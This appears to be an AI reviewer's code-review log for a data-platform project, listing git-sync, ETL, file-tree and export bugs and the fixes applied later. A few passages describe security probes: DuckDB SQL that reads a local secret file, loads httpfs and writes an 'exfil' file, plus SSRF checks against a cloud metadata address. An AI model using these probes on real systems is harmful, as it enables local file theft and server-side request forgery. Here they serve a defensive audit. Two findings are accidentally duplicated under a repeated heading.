- **🟡 Collapsed WS errors** — `HTTPException` keeps `WS_1008_POLICY_VIOLATION`, anything else closes `WS_1011_INTERNAL_ERROR`. Deliberately did **not** add logging calls: the backend has no `getLogger` convention anywhere, and introducing one in a fix pass is out of scope.

Not done (deliberate): the file-size splits (`entity-io.ts` 3068, the ETL tabs) — already tracked in `docs/planning/README.md`.

---

## 2026-08-10 — README + LICENSE on every versionable entity (backend columns, polymorphic attachments, export/import twins, 12 bundled licence texts) + ETL overhaul (persisted run history, right-sidebar, per-file versioning marks, attach-conflict fixes, quality-check cache) + file-tree multi-select & bulk actions across 4 explorers + selective git pull (ETL scope, shared docs-pull, X-Git-Cloned-Oid anchoring)

- Reviewed by: Claude Opus 5 — 5 parallel adversarial Explore sub-agents by feature group (1: readme/license + attachments; 2: ETL overhaul; 3: file trees / multi-select / uploads; 4: versioning / pull / anchor; 5: repo-wide hygiene + misc commits + prior-fix spot-check), plus an independent reviewer pass. **Every 🔴 was re-verified in source by the reviewer and 4 of 5 empirically reproduced** with throwaway probes (all deleted): the partial-pull anchor (2 remote files, 1 selected → 1 file written yet `gitSetSyncState` called with the full remote OID); the run-history race (live run evicted by a stale one, `f2` badge `running`→`undefined`, `pipelineRunning` still true); the ETL sandbox escape (arbitrary local file read `TOPSECRET`, local write, and `INSTALL/LOAD httpfs` all succeeding when `needs_file_access` is true); and the readme language relabelling (`{fr:'bonjour'}` → `README.md` → read back as `{en:'bonjour'}`). One agent claim was **corrected**: `humanBytes(1073689395)` prints `1023.9 MB`, not the reported `1024.0 MB` — only the KB→MB boundary misprints (a 512-byte window, 1048064–1048575 → "1024 KB").
- Range: efc20ecb..9889b7a0 (**89 commits, 298 files, ~16,413 insertions / ~2,198 deletions**). Working tree clean at review start and at review end. The first 8 commits (`4a761a7a`..`9b7f3b44`) are the 2026-08-09 review's own fixes landing — spot-checked intact rather than re-reviewed (see below).
- Last reviewed commit: 9889b7a0f6c2fdeefe589dda403a4306b5ef1698
- Verdict: **Needs work** — 4 🔴, all correctness/silent-data-loss (three in the git-anchor logic, one a cross-project bulk delete), plus a 🟠/🟡 set. **No security defect found in the new code**, and all 7 prior-review security fixes are verified intact (SSRF classifier live-tested).
- Tests: frontend **1190 passed** (90 files, +258 vs the 932 baseline) · backend **828 passed, 2 skipped** (5m08s, full suite) · Lint: **0 errors, 143 warnings** (all pre-existing React-Compiler class, same count as baseline) · Typecheck: `tsc -b` **0 errors** · i18n parity: **CLEAN (4377/4377, 0 divergence)** · export golden twins: **16 passed**.
- Notable: `test_project_export_assemble.py::test_assembler_reproduces_golden_tree` — **red in the previous two reviews, now GREEN**. The owner-type migration rewrote its `_seed`, so the server-side `_canonical_parse_options` twin is finally exercised end-to-end by a passing DB-backed test.
- Reminder: `apps/api` is not in the shipping build (prod = static WASM), but the 🔴 is **client-side and hits both modes**.

Findings:

**🔴 CRITICAL (all reproduced except #5, which was verified in source):**

- 🔴 **git_service.py:565-568 (`sync_state`, the `elif local_head:` branch) — the anchor is adopted from a scratch repo that a *status* call just reset to the remote head, and the wrong anchor is PERSISTED.** The comment claims the local HEAD means "we were here, the remote moved on". That is false for Linkr's server repos: `_sync_remote_branch` (`:327-331`) does `fetch` + `checkout -B` + `reset --mixed FETCH_HEAD` on **every** status/diff/commit_push, so the scratch HEAD tracks the *remote*, never what was applied to the DB. `GitSyncPanel.tsx:81-85` fires `ensureStatus` and `loadSyncState` in the **same mount effect** and both serialize on `_lock_for(repo_getter(uid))` — the *same* repo path. When status wins, `sync_state` sees `local_head == remote_head`, takes the `elif`, and returns `adoptedOid`; `git.py:158-160` then **writes it to the DB**. Result: `behind=false`, banner cleared, `mustPullFirst=false` — for content that was never applied. Because it is persisted, the remote's changes are invisible **forever**, and the "pull first" push guard is disarmed too. Fix: never derive the anchor from the scratch repo's HEAD (it carries no information about applied content) — backfill only from a value that provably reflects applied content (the `syncedOid` recorded at import), or drop the adoption and rely on `set-sync-state` at link/import time. There is **no** Python test for this branch.
- 🔴 **etl-store.ts:535-552 (`loadRunHistory`) — a run that starts during the in-flight storage read is destroyed, and can never reach a terminal status.** The `pipelineRunning` guard lives at the *caller* (`:219`), evaluated **before** the `await`; `loadRunHistory` itself writes `set({ runHistory, scriptStatuses: statusesOf(history[0]) })` unconditionally. **Reproduced**: with a deferred storage read, the live entry `run-1786393271816` was evicted by the stale `run-old`, `scriptStatuses.get('f2')` went `'running'` → `undefined`, and `pipelineRunning` stayed `true`. Second-order damage is worse than the wiped badges: `finishPipelineRun` (`:572-577`) and `stopPipelineRun` only mutate `history[0]` when its status is `'running'`, so once the live entry is gone the run **stays `'running'` in storage forever** and `statusesOf` relabels it `'stopped'` on every future reload — exactly the terminal-status regression this range set out to fix. Reachable by "open the pipeline, hit Run promptly" (the page calls `loadPipelineFiles` on mount, so the two overlap on any cold storage read). The same pre-`await` pattern affects `loadPipelineFiles` (`samePipeline` computed at `:204`, awaited at `:205`). Fix: re-check `pipelineRunning`/`activePipelineId` **after** the await and bail. All 33 existing `etl-run-state` tests drive the store synchronously, so none can catch this — add the async regression test.
- 🔴 **db_connect.py:805-809 — the ETL sandbox is porous on the COMMON path: user SQL gets arbitrary local file read/write and can `INSTALL/LOAD httpfs`.** `_lock_down_user_sql` only disables *auto*install/autoload and community extensions; an explicit `INSTALL httpfs; LOAD httpfs` is neither, and `lock_configuration` doesn't block extension DDL. The real protection is `enable_external_access=false` — which is **skipped whenever `needs_file_access` is true**, i.e. whenever there is mapping data or any parquet/external role (`:781`, `:795`). That is the *normal* configuration for a real pipeline (vocabulary mapping CSVs, Parquet source folders), not an edge case. **Reproduced against real DuckDB** with the exact production lockdown applied: `read_csv_auto('/…/secret.txt')` → `TOPSECRET`; `INSTALL httpfs` + `LOAD httpfs` → **succeeded**; `COPY (…) TO '/…/exfil.csv'` → file written. With external access off, the same statements are correctly `PermissionException`. Fairly stated: a *data-dependent* one-shot exfiltration could not be built (`COPY TO 'https://…'` is NotImplemented; DuckDB rejects non-constant URLs in table functions), so this is SSRF + arbitrary local FS read/write + blind egress, not secret exfiltration — but the code comment explicitly claims the door is shut ("e.g. httpfs to read /etc or exfiltrate"). Fix: reject `INSTALL`/`LOAD`/`ATTACH` at the statement level for the ETL path (no legitimate user script needs them), and/or scope the FS with DuckDB's `allowed_directories`/`allowed_paths` instead of leaving `enable_external_access` fully on.
- 🔴 **file-store.ts:1216 (+ `reloadFromDisk` :657-684) — a stale IDE multi-selection survives a project switch onto colliding ids → bulk delete hits the WRONG project's files.** `reloadFromDisk` deliberately gates `selectedFileId`, `openFileIds` and `expandedFolders` on `keepActive = prev.activeProjectUid === projectUid`, clearing them on a project change — but `selection` (the multi-select set) is **absent from that same `set({...})`** and from every load path, so it carries over. It is not rescued by `pruneSelection` (`FileTree.tsx:70-73`) because server-mode IDE ids are `sha1(relative path)[:16]` with **no project uid** (`project_fs.py:220-223`) — verified: `scripts/etl.sql` → `ide-2fd7f0b08ab92c58` in *every* project. So the stale ids exist in project B, survive pruning, still render tinted, and `actionTargets` returns all of them; `handleDelete`'s bulk branch (`FileTreeItem.tsx:331-335`) loops `deleteNode` over project B's files. The confirm dialog shows only `"Delete {{count}} files?"` — the single-file and folder cases name their target, the bulk case never does. Common trigger: template-derived projects sharing script names. Fix: reset `selection` whenever `activeProjectUid` changes (and include the project uid in `node_id` for the `ide`/`ds` prefixes so ids are globally unique).
- 🔴 **entity-io.ts:50-54 (`writeReadmeFiles`) vs :205-210 (`readReadmeByLang`) — a French-only README round-trips into the ENGLISH field, and the pull then overwrites the real English readme with French text.** The writer drops the suffix for the *primary* language, and the primary is `langs[0]` when there is no `en`; the reader maps a suffix-free `README.md` to `'en'` **unconditionally**. **Reproduced**: `{fr:'bonjour'}` → `README.md` → read back `{en:'bonjour'}`; `{en:'',fr:'bonjour'}` → same. `readReadmeByLang` feeds both the shared docs-pull (all 3 pull scopes) and the main import path (`entity-io.ts:1407`), so this hits import *and* pull for every entity type — and the primary user base is French. Fix: always suffix non-`en` languages (`README.fr.md` even when it is the only one), or record the primary language in the entity JSON so the reader can invert the mapping.

**🟠 IMPORTANT:**
- 🟠 attachment_service.py:24-33 (`list_readme_by_owner`) + entity-io.ts:97 (`writeAttachmentFiles`) — **attachment order is unsorted on BOTH sides, so `attachments/_meta.json` has no byte-parity guarantee.** The server `SELECT` has **no `ORDER BY`** (arbitrary by SQL contract); the client reads an IDB index. Every other list in these exporters is explicitly sorted for parity (`workspace_export_assemble.py:168` even uses a `_utf16_key`). With ≥2 attachments on one entity the two backends can emit different array orders → a false git diff that flips on every export, the exact class this versioning effort exists to prevent. **The golden twins cannot catch it**: 7 of 8 stub `readmeAttachments: { getByOwner: async () => [] }`, and the only one with real data (`project`) has exactly **1** attachment — so commit a071a8f1's "proven by the golden twins" overstates coverage. Also unguarded: the workspace fixture carries **no `license`** on the workspace or any project, so the `dd6c4e23` project/workspace `LICENSE.md` emission is untested by the twins. Fix: `.order_by(ReadmeAttachment.id)` server-side + sort by `id` client-side; put ≥2 attachments and a `license` in the etl-pipeline and workspace fixtures.
- 🟠 etl-pull.ts:336-391 — **`applyEtlPull` can never reject (6 × `.catch(() => {})`), so the anchor advances even when every DB write failed** and the dialog's rollback (`EtlPullDialog.tsx:115-118`, which resets `anchoredRef` "rather than claim a sync we failed to record") is **unreachable**. The commit message claims "a failed attempt leaves the banner up" — it does not. Fix: collect write failures, skip the anchor and reject so the existing rollback/retry path engages.
- 🟠 __fixtures__/export-golden/etl-pipeline/input.json — **the golden twin never exercises a pipeline WITH versioning marks** (`config` key absent entirely). `7e10dfa0` fixed byte-parity for the `config is None` branch, but marks change *which files are emitted* (`entity-io.ts:2193` `excludedFiles`, `:2207` `versionedDataFiles`) and that filtering has zero golden coverage on either side. Fix: add a fixture with populated `config` (and pin `excludedFiles: []` vs omitted, where Pydantic and `JSON.stringify` differ).
- 🟠 UploadDialog.tsx:87 + file-store.ts:876-892 — **IDE upload takes `file.name` verbatim: no reserved-name check and no path-separator stripping.** Every other entry point guards this (`FileTreeItem.tsx:195`, `CreateFileDialog.tsx:144`, `CreateFolderDialog.tsx:65`, `file-store.ts:963`), and the ETL path sanitises via `safeEtlFileName`. So a user can upload `README.md`/`LICENSE.md`/`attachments` at the root — defeating `4b0ce029` — and the export then silently overwrites it from the entity's own fields. A directory drop can also yield `sub/file.sql`. Not a filesystem breach (`project_fs._safe_join` blocks traversal server-side), but a consistency and silent-data-loss hole. Fix: promote `safeEtlFileName` to `lib/` and apply it + `isReservedTreeName` in `handleFiles`.
- 🟠 The four file trees disagree on **mixed folder/file selections**: `bulk` is computed from folder-inclusive `targets.length` in the dataset tree but files-only elsewhere, so selecting 2 folders shows single-file actions in 3 trees (delete hits only the right-clicked row while 2 rows *look* selected), and the dataset tree can present a menu containing nothing but Delete. Fix: put the rule next to `actionTargets` (e.g. `actionableTargets(selection, clickedId, predicate)`) and derive both `bulk` and `isMultiSelected` from it in all four trees.
- 🟠 Five-way regex divergence on the README language code: `[a-z-]+` in `isEntityDocsFile` (entity-io.ts:216) vs `[a-z]{2}` in `readReadmeByLang` (:208), `readEntityDocs` (:171), `etlDocTarget` (etl-pull.ts:229), `git-file-meta.ts:80` and the backend `_DOCS_RE` (git_service.py:665). **Verified**: `README.pt-BR.md` → `isEntityDocsFile: true` but `readReadmeByLang`/`etlDocTarget` don't match → the file is excluded from the tree import *and* unroutable by either docs channel, i.e. silently lost. Latent today (only en/fr ship) but a live trap the moment a locale is added. `readEntityDocs` also lacks `/i`. Fix: one exported regex/parser reused by all TS sites, with the Python twin kept in sync by comment.
- 🟠 csv-export.ts:11-28 vs concept-mapping/stcm-export.ts:87-91 — **two divergent `csvField` implementations, and the new SHARED one is the weaker.** `stcm-export`'s quotes a leading `= + - @`/tab/CR (formula injection, hardened by the previous review); the new `lib/csv-export.ts`, used by the ETL quality export (`EtlQualityTab.tsx:34`), guards only delimiter/quote/newline/whitespace. Quality rows carry concept names derived from source data. Fix: add the formula-trigger rule to `lib/csv-export.ts` and have `stcm-export` delegate to it.
- 🟠 docs/architecture.md — **the readme/license as-built landed nowhere.** CLAUDE.md: "the as-built lives in `docs/architecture.md`". The file was **not touched** in the whole 89-commit range (`git log … -- docs/architecture.md` → empty) and `grep -ci license` → **0**, yet `docs/planning/readme-license-plan.md` was deleted and `docs/planning/README.md:118-121` now asserts the as-built is there. A 25-commit feature across 9 scopes, a polymorphic attachment table and both exporters has no architectural record. (No *dangling references* — that part is clean.) Fix: write the section (owner-type table, LICENSE.md-vs-entity-JSON split, attachment owner resolution, export layout).

**🟡 MINOR:**
- 🟠 csv-export.ts:11-28 vs concept-mapping/stcm-export.ts:87-91 — **two divergent `csvField` implementations, and the new SHARED one is the weaker.** `stcm-export`'s version quotes a leading `= + - @`/tab/CR (spreadsheet formula injection — hardened by the 2026-08-09 review); the new `lib/csv-export.ts`, used by the ETL quality-check export (`EtlQualityTab.tsx:34`), guards only delimiter/quote/newline/whitespace. Quality rows carry concept names derived from source data, so the injection path is reachable with attacker-influenced content. Fix: add the formula-trigger rule to `lib/csv-export.ts` (quoting is lossless on the DuckDB read-back) and have `stcm-export` delegate to it, killing the duplication the shared module existed to remove.
- 🟠 docs/architecture.md (absent) + docs/planning/readme-license-plan.md (deleted) — **the readme/license plan was deleted without the as-built landing anywhere.** CLAUDE.md: "the as-built lives in `docs/architecture.md`". This range touched only `docs/planning/README.md` and the deleted plan; `grep -ci license docs/architecture.md` → **0**. A 25-commit feature spanning 9 entity scopes, a polymorphic attachment table, and both exporters now has no architectural record. (No dangling *references* to the deleted file — that part is clean.) Fix: write the readme/license section into `docs/architecture.md` (owner-type table, the LICENSE.md-vs-entity-JSON split, the attachment owner resolution).

**🟡 MINOR:**
- 🟡 entity-tree.ts:57-75 — reserved-name coverage is **asymmetric between README and LICENSE**, and bypassable by a trailing dot. Probed: bare `LICENSE`, `LICENCE`, `LICENSE.txt`, `COPYING` are all reserved, but bare `README`, `README.txt` and `readme.md.` are **accepted** (only `README(.lang)?.md` matches). The trailing dot matters because the docstring's own rationale is git-on-Windows/macOS behaviour, and Windows strips trailing dots → `readme.md.` lands as `readme.md`. The commit's rationale ("the file sits in the repo looking like the entity's licence while the real one lives on the entity") applies verbatim to a hand-authored `README`. Fix: normalise (`.trim()`, strip trailing dots/zero-width) before matching, reserve bare `readme`/`readme.txt`, and allow `.markdown`.
- 🟡 format-helpers.ts:181-183 (`humanBytes`) — the unit is chosen from the **raw** byte count while the printed value is rounded, so a 512-byte window (**1048064–1048575**) prints the impossible **"1024 KB"** / `"1024 ko"` instead of "1.0 MB". This is the identical bug the previous review fixed in `compactCount` (which now "decides the unit AFTER rounding"); `humanBytes` never got the same treatment. Side effect: `sizeColumnWidthCh` measures label length, so one such file widens the ETL size column. (The MB→GB boundary is fine — `1073689395` → `1023.9 MB`.) Fix: mirror `compactCount` — promote the unit when the rounded value reaches 1024. No test covers a unit boundary.
- 🟡 format-helpers.ts:233-235 (`naturalCompare`) — `sensitivity: 'base'` makes `a.sql` vs `A.sql` (and NFC vs NFD) compare **equal**, so the name tiebreak in `compareTreeNodes` (`file-tree-sort.ts:30`) does not actually stabilise the order its comment promises; with case-variant siblings the order falls back to store insertion order and can shuffle across reloads. Verified this does **not** threaten export byte-parity (the export sorts by raw codepoint via `entity-tree.ts:132` and `compareTreeNodes` has only display call sites). Fix: add a codepoint tiebreak; the existing test only compares distinct letters, so it never exercises a true tie.
- 🟡 use-plugin-actions.tsx:44 — commit `e13b8ef6` ("the missing imports") quietly fixed a **real behavioural bug**: the filter read `p.isReadOnly`, a field that exists **nowhere** in the codebase, so `!undefined` was always true and read-only plugins were never filtered out. The fix to `p.readOnly` is correct, but a behaviour change rode along in an unrelated commit.
- 🟡 db_connect.py:57 (`_SAFE_IDENT`) — `re.IGNORECASE` on a `str` pattern enables Unicode case-folding, so `[a-z]` also accepts `İ` `ı` `ſ` `K` (U+0130/0131/017F/212A). Enumerated U+0080–U+3000: **exactly those four**, and none contains a quote, semicolon, paren, backslash or space — so **not an injection vector**, just a wart (a name can validate yet not round-trip under DuckDB's own case-insensitive matching). Fix: add `re.ASCII`.
- 🟡 etl-store.ts:497, 529, 575 — side effects (`persistRun`) inside zustand `set` updaters, which should be pure. Harmless today, but it breaks under StrictMode double-render or any future middleware (duplicate save round-trips). `clearRunHistory` (`:560-567`) already does it correctly — compute in `set`, fire the effect after.
- 🟡 attachments.py:68 — a **global** schema preset (`SchemaPreset.workspace_id` is nullable, unlike the other six) can own `readme`/`license` columns but hits `404 "Owner has no workspace"` for attachments, so its documentation can never carry images. Fails *closed*, which is the right default; worth a comment or a global-permission branch.
- 🟡 project-pull.ts:357 — `void prepared`: a dead parameter kept only to silence the linter. Drop it. · `EtlPullDialog.tsx:84-86` — stray double blank line left by the `fc71813b` refactor. · `FileTreeItem.tsx:134-137` — `isBridge`/`bridgeDatasetFileId` are documented as always-false yet still gate ~10 live branches in a 640-line file; delete the flags and collapse them. · `FileTree.tsx:42-48` + `FileTreeItem.tsx:154-159` — `rootNodes`/`getChildren` filter+sort unmemoised on every render, and each row rebuilds two `Set`s from the config arrays (O(rows × depth) per keystroke elsewhere on the page); the dataset tree already does this correctly via a memoised `VersioningContext`. · `SqlScriptsFileTree.tsx:376-379` — `useSqlScriptsStore.getState()` read during render bypasses the subscription, so `bulk` can go stale. · `readme-attachments.ts:34-44` — `create` discards `att.workspaceId` (correct: the server stamps it) but says so nowhere, inviting a future "fix" that reintroduces trusting the client; the POST result is also unchecked.
- 🟡 EtlPipelineTab.tsx (1032→**1323**), EtlScriptsTab.tsx (1160→**1319**), EtlQualityTab.tsx (536→**820**, newly crossed) — three ETL tabs past the 800-line threshold and still growing; `entity-io.ts` is now **2972**. Fix: extract the run-history sidebar, the quality toolbar/table, and the scripts-tree glue.
- 🟡 ETL pull surfaces no **remote deletion**: `buildEtlPullPlan` iterates only remote `nodes`, so a file deleted on the remote but present locally yields no item, the pipeline reports "nothing to pull", and the dialog then auto-anchors past the deleting commit. Arguably intended (additive overlay), but then the anchor claims a content parity that does not hold — worth an explicit comment or a "removed on the remote" row.
- 🟡 VERSION still `2.2.1` while the **export format changed materially** (README.md/LICENSE.md now emitted for 9 scopes, `attachments/` layout switched to owner-keyed). CLAUDE.md says bump `VERSION` "when the export format changes". Functionally safe — `appVersion` is stamped on export and discarded on import, nothing branches on it, and front/back stamp identically (goldens green) — but the convention is unmet.
- 🟡 attachments.py:95-113 (`create_readme`) — the client supplies the attachment `id` and nothing pre-checks it; a duplicate raises an IntegrityError surfacing as a **500** rather than a 409. Not a security issue (`id` is the PK, so no silent cross-owner overwrite — verified in `models/attachment.py:24`), just a poor error.
- 🟡 db_connect.py:719-727 (`EtlRunHandle.cancel`) — `con` is read under the lock but `con.interrupt()` is called after releasing it, so it can race `con.close()` in the run's `finally`. Benign today (`_finish()` nulls `_con` first and the exception is swallowed), but the safety rests on ordering rather than the lock.

Verified sound ✅ (actively probed, no finding):
- **Every 2026-08-09 security fix is intact and was NOT regressed** by the 81 later commits: `is_local_endpoint` still excludes link-local/unspecified/`.internal`/IMDS and `is_blocked_endpoint` is called in `llm_proxy` at request time with `follow_redirects=False` (both call sites); `run_etl_sql` still calls `_lock_down_user_sql` after the legitimate ATTACHes and still validates role/table idents and escapes paths (**but see 🔴#3 — the lockdown is porous when `needs_file_access` is true**); `clear_conversations` still has its `dashboards:read` gate; `source-concept-ids.ts` has **0 NUL bytes** and the `\u0000` escape; `sql-tokenizer.ts` is used by `engine.ts`, `role-prefix.ts` **and** the new `statement-preview.ts`; `install.ts` still gates on `isSameEntity`; `SchemaBrowser` catalog-derived names still go through `quoteIdent`/`escSql` (incl. the new stats block at :371-423, pre-quoted with the reasoning commented).
- **The SSRF classifier was LIVE-TESTED**, not just read: `169.254.169.254` → blocked/not-local, `0.0.0.0:8000` → blocked, `metadata.google.internal` → blocked, while `127.0.0.1:11434` (Ollama) and `192.168.1.5:8080` stay local-and-allowed and `api.mistral.ai` is remote-and-allowed. The ordering subtlety is right: link-local is tested **before** the private allow, since 169.254/16 is also `is_private` in Python.
- **Untrusted readme/license markdown is sanitized** — `LicenseEditor` reuses `ReadmeEditor`'s vetted chain `[rehypeRaw, [rehypeSanitize, schema], rehypeKatex]` (correct order) plus `urlTransform`; view mode is a React-escaped `<pre>`. So license text arriving from an imported ZIP or a cloned repo cannot inject script.
- **Cross-tenant attachment id hijack is blocked** — a pytest probe had user B POST an attachment carrying user A's id: **409 integrity_conflict**, with A's row and blob bytes verified unchanged. The client-supplied PK is safe because `id` IS the primary key; the only cost is the 500 noted in 🟡.
- **Attachment blob keys cannot traverse** — `blob_store.path_for` enforces `^[0-9a-f]{64}$` and `blob_sha` is server-computed via `hashlib.sha256`, never client-supplied. `loadLicenseText` uses an `import.meta.glob` map lookup, not a dynamic path. Legacy by-project attachment data still reads (IDB v37 backfill is idempotent).
- **The "free the target file" change cannot destroy a live file** — `connection_pool.invalidate` pops the entry then blocks on `entry.lock` before `con.close()`, so it only closes a READ_ONLY handle and waits for any in-flight query; `_sweep_locked` skips locked entries.
- **`needs_file_access` is tighter than it looks in one respect** — a `file` role deliberately does *not* set the flag, and the role stays fully readable with external access off (it is attached before the lockdown). Good design; the gap in 🔴#3 is only the parquet/external/mapping case.
- **The ETL attach-conflict work is genuinely well-built** — `_alias_role` exposes an already-attached file as an in-memory DB of views (correct: DuckDB refuses the same file twice however aliased), `role.lower() == "target"` closes the case-dodge, every role/schema/table goes through `_require_ident` and every path through `_sql_path`, and the honest limitation (a table CREATEd later is invisible through the alias) is documented. `EtlRunHandle` is lock-guarded, handles cancel-before-bind, and is idempotent.
- **New ETL routes are correctly authorized** — all 5 run-history routes and all 3 quality-cache routes resolve the pipeline first and authorize through its workspace, with correct granularity (`etl:read`/`write`/`delete`; Refresh is `write` not `delete`, mirroring the DB stats cache). The quality cache is keyed `(scope, pipeline_id)` — no cross-project leak.
- **Attachment authorization is sound** — `_require_readme_owner` re-derives the owner from the DB for every operation (list/create/blob/delete), maps owner_type through an **allowlist** (unknown → 422), 404s a missing owner or a workspace-less one, and stamps `workspace_id` **server-side** rather than trusting the client. `workspace_id` FK keeps the CASCADE the polymorphic owner costs; each entity's delete calls `delete_readme_for_owner`.
- **tree-selection.ts is the model of how to do this** — fixed Shift anchor (ranges shrink as well as grow), ranges over the VISIBLE order so a collapsed folder's children can't be swept in, collapsed-anchor fallback, `pruneSelection` drops stale ids with an identity-preserving early return, and `actionTargets` makes a right-click outside the selection act on that row alone. 16 tests.
- **dataset-upload-target.ts** — pure, case-insensitive (reasoned from the git/macOS constraint), 'overwrite' reuses the EXISTING name so `Data.csv` replaces `data.csv` instead of landing beside it, and the id is preserved by path identity rather than delete+recreate (which is what dropped analyses and versioning marks before). The comment explains the two-behaviours-for-one-action bug it fixes.
- **entity-docs-pull.ts** — handles the `{}`-is-truthy trap and the cleared-readme (`{en: ''}`) case, so a missing remote readme can't blank a local one nor read as "forever changed"; the README-language split is the exact inverse of the export. Genuinely shared across all 3 scopes that have selective pull — **no** partial-wiring asymmetry of the `relink_creator_on_update` kind.
- **Export twins hold** — 16 golden tests green across the 7 standalone scopes + project + workspace + mapping project, with the new `README.md`/`README.fr.md`/`LICENSE.md` expected files. `entity_docs.py` is a documented byte-faithful port of the TS helpers.
- **Migrations linear + reversible** — `f6a7b8c9d0e1 → a7b8c9d0e1f2 → b8c9d0e1f2a3 → c9d0e1f2a3b4`, connecting to the pre-range head. The readme/license downgrade is **data-preserving** (restores `project_uid` from `owner_id` for project-owned rows); the new polymorphic owner has its `ix_readme_attachments_owner` index.
- **Hygiene sweep clean** — new `console.log`: **0**; new `: any`/`as any`: **0**; new `dangerouslySetInnerHTML`: **0**; hardcoded secrets: **0**; **0 new dependencies** (the 12 licence texts are static markdown, not packages — zero hallucinated-package risk); **0 files with C0 control characters** across all 298 changed files (the past NUL-byte defect class, re-swept); i18n **4377/4377**; no dangling references to the deleted plan file.
- **No SQL in the new ETL surfaces** — `quality-diff.ts`, `vocabulary-readiness.ts`, `etl-file-language.ts`, `statement-preview.ts` are pure transforms; `EtlQualityTab`/`EtlPipelineTab` contain no SQL construction at all.
- **New pure logic is broadly well tested** — 81 tests across `etl-pull` (34), `entity-docs-pull` (18), `tree-selection` (16), `upload-conflicts` (10), `etl-pull-anchor` (3), plus `file-tree-sort`, `dataset-upload-target`, `quality-diff`, `vocabulary-readiness`, `csv-export`, `csv-preview`; 221 frontend ETL tests and 46 backend ETL tests green. `tree-selection` and `dataset-upload-target` are genuinely thorough (anchor pivoting, hidden anchor, stale ids, referential identity).
- **`isQualityCacheUsable` staleness handling is correct** — requires **both** `targetDataSourceId` and `fingerprint` to match, so a repointed pipeline cannot show the previous database's counts; `qualityFingerprint` uses `reduce(max)` rather than the last element, so re-sorted run history doesn't read as a different fingerprint; the load is gated on `runHistoryLoaded`.
- **Storage abstraction stayed symmetric** — all 44 `Storage` interface members implemented in both `idb-storage.ts` and `api-storage.ts` (44/44 each, 0 missing either side); the new `etlQualityCache` is present in all three layers.

**Test gaps that let the 🔴s through** (each finding's own case is untested): no partial-selection pull test; no failed-apply pull test; no Python test for `sync_state`'s HEAD-adoption branch at all; every one of the 33 `etl-run-state` tests drives the store synchronously, so none can catch the async run-history race; no golden fixture with ≥2 attachments, with a populated `config`, or with a project/workspace `license`; no `humanBytes` unit-boundary test; no `compareTreeNodes` true-tie test.

Notes / follow-ups:
- Carried from earlier reviews and still open: `entity-io.ts` (2972) / `seed-loader.ts` / `WorkspacesPage.tsx` past the split threshold; ATHENA import OOM (client mode); the group-access rework items in `docs/planning/users-authorizations-audit.md`.
- `docs/planning/README.md:110` tracks a real remaining gap: DQ rule sets / catalogs / schema presets are flat files in a workspace export, so their README/LICENSE only ship in a standalone entity export.
- User-facing docs for readme/license are still to be written in `../linkr-website` — acknowledged at `docs/planning/README.md:122`, not forgotten.

### Fixes applied — 2026-08-11 (all findings, committed)

The user asked for everything to be fixed. **All 4 🔴, all 8 🟠 and the 🟡 batch are done**, each with a test, and each of the three most severe verified by removing the fix and watching the new test fail. Final gates: frontend **1261 tests** green (was 1190), backend **831 passed / 2 skipped**, `tsc -b` **0**, lint **0 errors** (143 pre-existing React-Compiler warnings), i18n **4383/4383**. Seven commits: `701c1f49`, `71113721`, `3c28fb90`, `ca663be5`, `42bf762f`, `b958f1d2`, `b5ddefa1`.

**🔴 (all fixed):**
- **Sync anchor never inferred** — the `elif local_head:` adoption is gone from `sync_state`, and the route no longer persists an `adoptedOid` (the key is dropped from the response entirely). An unanchored entity stays unanchored. The two tests that pinned the OLD behaviour were rewritten to pin the new one, plus a third proving a real anchor still detects "behind".
- **Run-history race** — `loadRunHistory` re-checks `pipelineRunning`/`activePipelineId` **after** the await; `loadPipelineFiles` likewise reads `samePipeline` after its own. Two async regression tests (deferred storage promise) — both fail without the guard.
- **ETL sandbox** — `_reject_forbidden_statements` refuses `INSTALL`/`LOAD`/`ATTACH` (and `FORCE INSTALL`) per split statement, on the FINAL sql so nothing can be smuggled through a `mapping.<name>` substitution. Applied to `run_etl_sql` and `query_file_source`. Verified against real DuckDB that `allowed_directories` genuinely cannot help here (refused before startup; enforced only while external access is off, which cannot be re-enabled at runtime) — that dead end is now documented in the code. Tests cover the `needs_file_access` path the old test missed, plus a no-false-positive case.
- **Cross-project IDE selection** — `selection` is cleared on a project switch in `loadProjectFiles` and pruned/cleared in `reloadFromDisk`, which had deliberately reset three sibling fields and omitted this one. Ids stay path-derived (changing them would churn every stored id), so the test asserts the dangerous case directly: the same ids exist in both projects.
- **README language** — `readmeLang` travels in the entity JSON (omitted when English, so existing exports stay byte-identical), written by `stripEntityDocs` on both sides in matching key order and honoured by every reader, `withEntityDocs` included. One `README_FILE_RE` in `entity-tree.ts` replaced seven copies; `_DOCS_RE` widened to match.

**🟠 (all fixed):**
- **Partial pull** — `isCompleteEtlPull` / `isCompleteProjectPull` gate the anchor; an empty plan still counts as complete, so "nothing to pull, just record the baseline" is unchanged. `applyEtlPull` collects write failures and throws instead of swallowing six `.catch(() => {})` (the dialog already displays it, so its rollback is reachable at last).
- **Attachment order** — sorted by id on both sides. The project fixture gained a second attachment listed BEFORE it sorts, which promptly **caught a real Python divergence** (`project_export.py` emitted input order).
- **Golden coverage** — the ETL fixture now carries a populated `config` (marked CSV travels, unmarked one dropped from the zip AND `_tree.json`, excluded script dropped), which **caught a second real divergence**: the response schema declared `config` before `createdAt`/`version` while the client emits it after — identical content, different bytes. The project fixture gained a licence, and both DB-backed seeds were fixed to actually set `license`/`config`.
- **IDE upload** — `safeUploadFileName` (shared) strips path separators and refuses reserved root names; `createFileWithContent` carries the same guard `createFolder` already had. New `files.upload_rejected` key in both locales.
- **Bulk semantics** — `actionableTargets` + `isRowInBulkSelection` derive the tint and `bulk` from one actionable set across all four trees (the dataset tree counts folders, since its Delete removes a subtree; the others do not). Also fixed a `getState()` read during render in the SQL tree.
- **CSV injection** — the formula-trigger guard moved into the shared `csvField`; `stcm-export` now re-exports it instead of keeping a stronger private copy.
- **As-built docs** — a new "Entity documentation" section in `docs/architecture.md`, and the Versioning section's stale "lazily adopted after an import" line corrected.

**🟡 batch:** `humanBytes` decides the unit after rounding (no more "1024 KB"); `compareTreeNodes` gained a codepoint tiebreak (`naturalCompare` returns 0 for case-only differences, so the documented stable fallback did not hold); `_SAFE_IDENT` gained `re.ASCII` (İ/ı/ſ/K were accepted — never an injection vector, just a wart); `persistRun` hoisted out of three zustand `set` updaters; dead `void prepared` parameter removed; `isReservedTreeName` now covers bare `README`/`README.txt`/`.markdown` and strips trailing dots (Windows drops them) without swallowing `readme.sql`; **VERSION 2.2.1 → 2.3.0** with all five stamps.

